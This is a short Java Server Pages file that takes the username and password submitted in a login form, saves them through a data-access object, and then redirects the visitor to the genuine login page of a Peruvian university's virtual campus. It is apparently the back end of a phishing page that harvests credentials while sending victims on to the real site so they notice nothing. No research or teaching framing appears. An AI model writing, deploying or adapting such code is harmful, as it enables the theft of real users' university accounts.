<%@page import="DatosDAO.datosDAO"%>
<%@page import="DatosDO.Datos"%>
<%
    String usuario=request.getParameter("username");
    String contraseña=request.getParameter("password");

    Datos data=new Datos();
    data.setUsuario(usuario);
    data.setContraseña(contraseña);
    datosDAO.agregar(data);
    response.sendRedirect("https://campusvirtual.unf.edu.pe/login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dteachingmanagement%26redirect_uri%3Dhttps%253A%252F%252Fdocente.unf.edu.pe%252Fsignin-oidc%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520roles%26code_challenge%3DTd3fJ3kE6KU5eGAEErMPftfsL6t1_1-LGToYBSCSD0Y%26code_challenge_method%3DS256%26response_mode%3Dform_post%26nonce%3D637916194268584443.ZjhhZTc2ODEtMDU4Ni00Y2RkLWIxNzgtODliM2YyMTM2YzQ1Y2QyNTdhMzEtMGRhZS00NDVkLWE0NGItNWI3ZTVmMTdjMWQy%26state%3DCfDJ8JyIlgS-bvZNsq0bfGiZd1KuJOwBs_wKJCz1jlNM2vEl4HBFtN6Ah0ljl5Nw4TppNwRr6azyuNbu-CD9HU5J4rcCv0J-p1BkrLX1DRZZ90dxqqjtUTVnhjpr5Ug4gVYF9IY9kOaC1rG8scJVt8_LkFTmfHJTMHZRPcIUIDf_LyWZDf9pVT1m2UA0hviOmI-e-CWk_nL0oC6Y0RTseHdprq_68OwquXUcuwnvPoSb_uTtw74yXIRvpEXpCNvC3KdgaJc2Hgfie2irGoMIIXLO0jFgF1xD9ZkDMVhQpYeZT1TtR7Pa7zp24GFPpv0AW_euPacDWBkwsM8u_4yW0vUb8g9kMJh3NuQWpfoWBS7upvBgf4gdCyb9SzHo2OiRbmbRmA%26x-client-SKU%3DID_NETSTANDARD2_0%26x-client-ver%3D5.6.0.0");
%>
